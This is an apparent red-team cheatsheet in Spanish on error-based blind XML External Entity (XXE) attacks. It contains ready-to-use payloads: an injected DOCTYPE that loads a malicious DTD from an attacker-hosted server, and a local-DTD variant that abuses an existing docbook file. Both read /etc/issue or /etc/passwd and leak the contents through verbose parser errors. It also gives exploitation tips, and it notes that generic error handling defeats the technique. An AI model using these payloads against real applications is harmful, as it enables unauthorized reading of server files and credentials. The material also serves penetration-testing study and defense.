---
aliases:
tags:
  - type/cheatsheet
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
type: CheatSheet
linked:
  - "[[XML External Entity (XXE)]]"
---
# XXE - Blind Basado en Errores

***

## Cheatsheet

| **Objetivo Estratégico**                     | **Descripción de la Técnica**                                                                                                                                                                                                                                                        | **Estructura del Payload y DTD**                                                                                                                                                                                                                                                                                                                                                     |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Forzar Error con DTD Externo**             | El servidor permite peticiones salientes pero no la exfiltración directa de datos. Alojo un DTD malicioso en mi infraestructura. El payload XML inyectado invoca este DTD, el cual lee el archivo y provoca el error al evaluar la ruta dinámica.                                    | **XML inyectado:**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://mi-servidor.com/malicioso.dtd"> %xxe;]><foo/>`<br><br>**malicioso.dtd:**<br>`<!ENTITY % file SYSTEM "file:///etc/issue">`<br>`<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///inexistente/%file;'>">`<br>`%eval;`<br>`%error;`                                                                            |
| **Forzar Error con DTD Local (Total Blind)** | El firewall bloquea absolutamente cualquier conexión saliente. Para evadir esto, busco un archivo DTD legítimo que ya exista en el sistema de archivos del servidor (ej. dependencias de GNOME, docbook) y redefino sus entidades para ejecutar mi carga útil generadora de errores. | **XML inyectado:**<br>`<!DOCTYPE foo [`<br>`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`<br>`<!ENTITY % ISOamso '`<br>`<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">`<br>`<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///inexistente/&#x25;file;&#x27;>">`<br>`&#x25;eval;`<br>`&#x25;error;`<br>`'>`<br>`%local_dtd;]><foo/>` |

^xxe-blind-errores

## Consideraciones de Explotación

- **Restricciones de la Especificación XML:** La especificación estándar de XML prohíbe estrictamente el uso de entidades de parámetros para definir dinámicamente otras entidades dentro del subconjunto DTD interno (inline). Por este motivo, el encadenamiento de entidades siempre debe ocurrir invocando un DTD externo o redefiniendo entidades dentro de un DTD local cargado mediante una ruta absoluta.
- **Ruptura por Caracteres de Nueva Línea:** Si el archivo que intento extraer contiene múltiples saltos de línea (como `/etc/passwd`), la construcción de la URL malformada fallará prematuramente en algunos parsers (como las versiones modernas de Java), ya que los saltos de línea no son válidos en identificadores de URI. En estos casos, el parser suele arrojar un error de formato de URI genérico en lugar de reflejar el contenido deseado.
- **Dependencia de la Verbosidad:** Esta técnica queda completamente neutralizada si la aplicación maneja las excepciones de forma segura en el backend y devuelve mensajes de error genéricos a nivel HTTP (ej. "HTTP 500 Internal Server Error" o "Invalid input") en lugar de exponer la traza de la pila o el mensaje exacto emitido por el analizador XML subyacente.

***

## Overview

La exfiltración basada en errores es una técnica táctica de [[Blind XXE]] que empleo cuando el servidor es vulnerable a la inyección de entidades externas, pero los firewalls perimetrales bloquean las conexiones salientes, imposibilitando la técnica de exfiltración de red mediante [[XXE Out-of-Band (OOB)]]. Si la aplicación es propensa a devolver mensajes de error detallados (verbose errors) del parser XML directamente en la respuesta HTTP, puedo forzar una falla de resolución que incluya el contenido del archivo objetivo dentro del propio texto de la excepción.

### Mecanismo de Acción

El ataque requiere el uso de entidades de parámetros (`%`) para encadenar la lectura de un archivo objetivo con la generación intencional de un error sintáctico o de ruta. El flujo lógico consiste en leer el contenido del archivo local y luego utilizar ese valor para construir dinámicamente la ruta de un recurso inexistente (por ejemplo, `file:///recurso_inexistente/CONTENIDO_DEL_ARCHIVO`). Al intentar cargar esta ruta malformada, el parser XML abortará la operación y el mensaje de excepción arrojado por el backend revelará la ruta completa, exponiendo así el contenido extraído.

***

## Notas Relacionadas


***
